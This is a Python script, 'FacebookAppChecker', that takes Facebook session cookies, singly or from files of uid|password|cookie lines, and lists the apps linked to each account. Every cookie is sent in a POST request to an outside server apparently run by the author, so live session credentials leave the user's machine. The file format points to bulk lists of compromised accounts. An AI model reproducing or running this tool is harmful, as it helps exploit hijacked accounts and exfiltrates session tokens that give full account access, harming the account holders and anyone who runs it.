#!/usr/bin/env python3
# Author: S. SHAJON (github.com/SHAJON-404)

import requests
import os

class FacebookAppChecker:
    # Colors
    r = '\x1b[1;31m'
    g = '\x1b[1;32m'
    b = '\x1b[1;34m'
    w = '\x1b[1;37m'

    def __init__(self):
        os.system("cls" if os.name == "nt" else "clear")
        print(f"{self.b}-{self.w}" * 56)
        print(f"        [//] FacebookAppChecker By S. SHAJON [//]")
        print(f"{self.b}-{self.w}" * 56)
        print(f"[1] SINGLE COOKIES")
        print(f"[2] COOKIES FILE")
        print(f"{self.b}-{self.w}" * 56)
        
        choice = input("[//] Select Option : ")
        
        print(f"{self.b}-{self.w}" * 56)

        if choice == '1':
            self.process_manual_input()
        elif choice == '2':
            filename = input("[//] Enter filename: ")
            self.process_file_input(filename)
        else:
            print(f"{self.r}[//] Invalid choice{self.w}")

    # Function to get apps data from server
    def show_apps(self, cookies):
        try:
            response = requests.post(
                'https://shajon404.pythonanywhere.com/facebook_apps',
                json={"cookies": cookies}
            )
            data = response.json()
            return data
        except ValueError:
            return {"all_apps": {"active_apps": {}, "inactive_apps": {}}}

    # Function to display apps nicely
    def display_apps(self, data):
        print(f"{self.b}-{self.w}" * 56)

        # Active apps
        if data['all_apps'].get('active_apps'):
            print("[//] ACTIVE APPS █")
            print(f"{self.b}-{self.w}" * 56)
            for app, date in data['all_apps']['active_apps'].items():
                print(f"[//] {app} => {date}")
        else:
            print("[//] No active apps found")
        print(f"{self.b}-{self.w}" * 56)

        # Inactive apps
        if data['all_apps'].get('inactive_apps'):
            print("[//] INACTIVE APPS █")
            print(f"{self.b}-{self.w}" * 56)
            for app, date in data['all_apps']['inactive_apps'].items():
                print(f"[//] {app} => {date}")
        else:
            print("[//] No inactive apps found")
        print(f"{self.b}-{self.w}" * 56)

    # Function to process manual input
    def process_manual_input(self):
        cookies = input(f"[//] COOKIES : {self.g}")
        data = self.show_apps(cookies)
        self.display_apps(data)

    # Function to process file input
    def process_file_input(self, filename):
        try:
            with open(filename, 'r') as f:
                lines = f.readlines()
            for line in lines:
                line = line.strip()
                if not line or '|' not in line:
                    continue
                uid, password, cookies = line.split('|')
                print(f"{self.g}[//] CHECKING FOR UID : {uid}{self.w}")  # <-- Added line
                data = self.show_apps(cookies)
                self.display_apps(data)
        except FileNotFoundError:
            print(f"{self.r}[//] File not found: {filename}{self.w}")
        except Exception as e:
            print(f"{self.r}[//] Error: {e}{self.w}")


if __name__ == "__main__":
    FacebookAppChecker()
